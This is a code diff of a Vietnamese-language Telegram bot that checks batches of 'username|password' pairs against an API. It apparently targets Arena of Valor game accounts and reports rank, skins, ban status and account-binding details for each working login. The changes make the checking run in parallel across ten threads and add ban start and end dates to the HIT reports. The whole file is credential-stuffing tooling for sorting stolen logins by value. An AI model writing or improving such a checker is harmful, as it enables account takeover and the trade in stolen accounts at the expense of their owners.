@@ -1,7 +1,7 @@
 import asyncio, os, time, logging, secrets, pytz, json, threading, requests
 from datetime import datetime
 from collections import defaultdict
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask
 from threading import Thread
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -35,6 +35,7 @@ TZ = pytz.timezone("Asia/Ho_Chi_Minh")
 SPAM_WINDOW = 10
 MAX_SPAM = 5
 MUTE_TIME = 60
+CHECK_WORKERS = 10  # số luồng check đồng thời
 OUTPUT_DIR = "lq_data"
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 
@@ -126,19 +127,43 @@ def check_acc_api(username, password):
         d = r.json()
         if d.get("ok") and d["result"].get("status") == "HIT":
             info = d["result"]; skins = info.get("aov_skins", {})
-            return {"status": "HIT", "username": username, "name": info.get("aov_name"), "uid": info.get("uid"),
-                    "rank": info.get("aov_rank"), "level": info.get("aov_level"), "skins": skins.get("total_skins", 0),
-                    "champs": skins.get("total_champs", 0), "banned": info.get("aov_banned"), "fb_linked": info.get("fb_linked"),
-                    "mobile_bound": info.get("mobile_bound"), "email_verified": info.get("email_verified")}
-        else: return {"status": "MISS", "username": username, "message": d.get("result", {}).get("detail", "Sai mật khẩu / không tồn tại")}
-    except Exception as e: return {"status": "ERROR", "username": username, "message": str(e)}
+            ban_info = info.get("aov_banned", "NO")
+            ban_start = info.get("ban_start", "")
+            ban_end = info.get("ban_end", "")
+            if isinstance(ban_info, dict):
+                ban_start = ban_info.get("start", ban_start)
+                ban_end = ban_info.get("end", ban_end)
+                ban_status = "YES" if ban_info.get("status") == "banned" else "NO"
+            else:
+                ban_status = ban_info
+
+            return {
+                "status": "HIT",
+                "username": username,
+                "name": info.get("aov_name"),
+                "uid": info.get("uid"),
+                "rank": info.get("aov_rank"),
+                "level": info.get("aov_level"),
+                "skins": skins.get("total_skins", 0),
+                "champs": skins.get("total_champs", 0),
+                "banned": ban_status,
+                "ban_start": ban_start,
+                "ban_end": ban_end,
+                "fb_linked": info.get("fb_linked"),
+                "mobile_bound": info.get("mobile_bound"),
+                "email_verified": info.get("email_verified"),
+            }
+        else:
+            return {"status": "MISS", "username": username, "message": d.get("result", {}).get("detail", "Sai mật khẩu / không tồn tại")}
+    except Exception as e:
+        return {"status": "ERROR", "username": username, "message": str(e)}
 
 def check_acc_batch(acc_list):
     results = []
-    for acc_str in acc_list:
-        if "|" not in acc_str: results.append({"status": "ERROR", "username": acc_str, "message": "Sai định dạng"}); continue
-        u, p = acc_str.split("|", 1)
-        results.append(check_acc_api(u, p))
+    with ThreadPoolExecutor(max_workers=CHECK_WORKERS) as executor:
+        future_to_acc = {executor.submit(check_acc_api, u, p): (u, p) for acc_str in acc_list if "|" in acc_str for u, p in [acc_str.split("|", 1)]}
+        for future in as_completed(future_to_acc):
+            results.append(future.result())
     return results
 
 def get_check_limit(uid):
@@ -289,6 +314,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         accs_to_check = acc_list[:can_check]
         loop = asyncio.get_event_loop()
         results = await loop.run_in_executor(None, check_acc_batch, accs_to_check)
+        # Chỉ tính kết quả HIT/MISS là thành công
         success_results = [r for r in results if r["status"] in ("HIT", "MISS")]
         if success_results: update_check_count(uid, len(success_results))
         hit = [r for r in results if r["status"] == "HIT"]
@@ -296,10 +322,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = f"📊 *Kết quả check {len(results)} acc*\n\n✅ HIT: {len(hit)}\n❌ MISS/ERROR: {len(miss)}\n"
         if hit:
             text += "\n*Chi tiết HIT:*\n"
-            for r in hit[:5]: text += f"👤 `{r['username']}` - {r.get('name','?')}\n   Rank: {r.get('rank','?')} | Lv: {r.get('level','?')}\n   Skin: {r.get('skins',0)} | Tướng: {r.get('champs',0)}\n"
+            for r in hit[:10]:
+                ban_text = "Không"
+                if r.get("banned") == "YES":
+                    ban_text = "Có"
+                    if r.get("ban_start") and r.get("ban_end"):
+                        ban_text += f" ({r['ban_start']} → {r['ban_end']})"
+                    elif r.get("ban_start"):
+                        ban_text += f" (từ {r['ban_start']})"
+                text += (
+                    f"👤 `{r['username']}` - {r.get('name','?')}\n"
+                    f"   Rank: {r.get('rank','?')} | Lv: {r.get('level','?')}\n"
+                    f"   Skin: {r.get('skins',0)} | Tướng: {r.get('champs',0)}\n"
+                    f"   Ban: {ban_text}\n"
+                )
         if miss:
             text += "\n*MISS/ERROR:*\n"
-            for r in miss[:3]: text += f"❌ `{r['username']}` - {r.get('message','?')}\n"
+            for r in miss[:5]: text += f"❌ `{r['username']}` - {r.get('message','?')}\n"
         kb, _ = main_menu(uid)
         await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
 
